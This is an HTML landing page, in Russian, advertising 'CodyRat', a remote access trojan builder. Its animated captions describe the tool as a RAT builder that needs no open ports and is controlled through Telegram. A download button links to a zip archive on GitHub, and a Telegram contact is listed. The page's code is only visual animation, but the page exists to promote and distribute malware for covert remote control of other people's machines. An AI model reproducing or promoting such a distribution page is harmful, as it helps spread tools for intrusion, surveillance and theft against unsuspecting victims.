<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CodyRat</title>
    <style>
        body { margin: 0; background: #050505; color: #00ff41; font-family: 'Courier New', monospace; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        canvas { position: absolute; top: 0; left: 0; z-index: 0; }
        .ui { position: relative; z-index: 1; text-align: center; width: 90%; flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .header { font-size: 32px; font-weight: bold; margin-bottom: 10px; text-shadow: 0 0 8px #00ff41; }
        .typewriter { font-size: 18px; margin-bottom: 40px; height: 20px; }
        .cursor { animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
        .btn { padding: 25px 50px; border: 2px solid #00ff41; background: rgba(0, 255, 65, 0.05); color: #00ff41; font-size: 20px; cursor: pointer; text-transform: uppercase; transition: 0.3s; width: 100%; max-width: 350px; }
        .btn:hover { background: #00ff41; color: #050505; box-shadow: 0 0 15px #00ff41; }
        .tg-container { position: absolute; bottom: 20px; width: 100%; text-align: center; }
        .tg { color: #808080; font-size: 14px; text-decoration: none; }
    </style>
</head>
<body>
    <canvas id="grid"></canvas>
    <div class="ui">
        <div class="header">CodyRat</div>
        <div class="typewriter" id="text"></div>
        <button class="btn" onclick="window.location.href='https://github.com/unt1tledead/codyrat/raw/main/Kakashki.zip'">EXECUTE DOWNLOAD</button>
    </div>
    <div class="tg-container">
        <a href="https://t.me/mynewdead" class="tg">TG: @mynewdead</a>
    </div>

    <script>
        const canvas = document.getElementById('grid'), ctx = canvas.getContext('2d');
        let width = canvas.width = window.innerWidth;
        let height = canvas.height = window.innerHeight;
        const pts = [];
        const spacing = 60;
        
        for(let x = 0; x < width; x += spacing) {
            for(let y = 0; y < height; y += spacing) {
                pts.push({x, y});
            }
        }
        
        function drawLightning(x1, y1, x2, y2) {
            ctx.beginPath();
            ctx.moveTo(x1, y1);
            let steps = 6;
            for(let k = 1; k < steps; k++) {
                let nx = x1 + (x2 - x1) * (k / steps) + (Math.random() * 40 - 20);
                let ny = y1 + (y2 - y1) * (k / steps) + (Math.random() * 40 - 20);
                ctx.lineTo(nx, ny);
            }
            ctx.lineTo(x2, y2);
            ctx.stroke();
        }
        
        function draw() {
            ctx.fillStyle = '#050505'; 
            ctx.fillRect(0, 0, width, height);
            
            ctx.fillStyle = '#003300';
            pts.forEach(p => {
                ctx.beginPath(); ctx.arc(p.x, p.y, 1.5, 0, Math.PI*2); ctx.fill();
            });

            if(Math.random() > 0.95) {
                let p1 = pts[Math.floor(Math.random() * pts.length)];
                let p2 = pts[Math.floor(Math.random() * pts.length)];
                
                ctx.strokeStyle = '#00d4ff';
                ctx.lineWidth = 1.5;
                ctx.shadowBlur = 10;
                ctx.shadowColor = '#00d4ff';
                drawLightning(p1.x, p1.y, p2.x, p2.y);
                
                ctx.shadowBlur = 0;
                ctx.shadowColor = 'transparent';
            }
            requestAnimationFrame(draw);
        }
        draw();
        
        const texts = ["Бот билдер ратников", "Ратник будущего", "Работает без портов", "Управление через телеграм"];
        let i = 0, j = 0, del = false, pause = false;
        
        function type() {
            if (pause) return; 

            const txt = texts[i];
            document.getElementById('text').innerHTML = txt.substring(0, j) + '<span class="cursor">_</span>';
            
            if(!del && j < txt.length) {
                j++;
                setTimeout(type, 120);
            }
            else if(del && j > 0) {
                j--;
                setTimeout(type, 40);
            }
            else {
                if (!del && j === txt.length) {
                    pause = true; 
                    setTimeout(() => {
                        pause = false; 
                        del = true; 
                        type();
                    }, 1000); 
                } 
                else if (del && j === 0) {
                    del = false;
                    i = (i + 1) % texts.length;
                    setTimeout(type, 120);
                }
            }
        }
        type();
    </script>
</body>
</html>
